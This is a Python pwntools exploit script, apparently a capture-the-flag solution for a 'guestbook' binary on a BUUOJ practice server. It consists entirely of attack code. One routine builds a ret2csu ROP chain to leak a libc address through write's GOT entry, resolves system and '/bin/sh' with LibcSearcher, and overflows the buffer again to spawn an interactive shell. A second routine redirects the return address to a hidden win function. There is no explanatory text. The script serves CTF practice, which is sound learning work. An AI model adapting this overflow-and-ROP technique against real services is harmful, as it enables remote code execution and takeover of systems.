from pwn import *
from LibcSearcher import *
context(log_level='debug', arch='amd64')

elf = ELF('./guestbook')
write_plt = elf.plt['write']
write_got = elf.got['write']
main = 0x004004e0
# gadgets
pop_csu = 0x004006ea
mov_rdx_r13 = 0x004006d0
pop_rdi = 0x004006f3

if len(sys.argv) > 1:
  conn = remote('node4.buuoj.cn',26473)
else:
  conn = process(sys.argv[0][:-7])
  #gdb.attach(conn)

conn.recvuntil(b'message:\n')

def exp1():
    '''
    leak libc
    '''
    r12 = write_got 
    r13 = 0x8
    r14 = write_got
    r15 = 0x1
    payload = cyclic(0x88)
    payload += p64(pop_csu) + p64(0) + p64(1) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
    payload += p64(mov_rdx_r13) + p64(0)*7 
    payload += p64(main)
    conn.send(payload)
    conn.recvline()
    leak_addr = u64(conn.recv(8))
    print(f'leak addr : {hex(leak_addr)}')
    libc = LibcSearcher('write',leak_addr)
    libc_base = leak_addr - libc.dump('write')
    system = libc_base + libc.dump('system')
    binsh = libc_base + libc.dump('str_bin_sh')
    print(f'system addr : {hex(system)}')
    print(f'binsh addr : {hex(binsh)}')
     
    conn.recvuntil(b'message:\n')
    payload = cyclic(0x88) + p64(pop_rdi) + p64(binsh) + p64(system)
    conn.sendline(payload)
    conn.recvline()

    conn.interactive()

def exp2():
    '''
    read - write
    '''
    good_game = 0x00400620
    readmessage = 0x00400670

    payload = cyclic(0x88) + p64(good_game)
    conn.sendline(payload)
    conn.recv()
    #conn.interactive()

exp2()
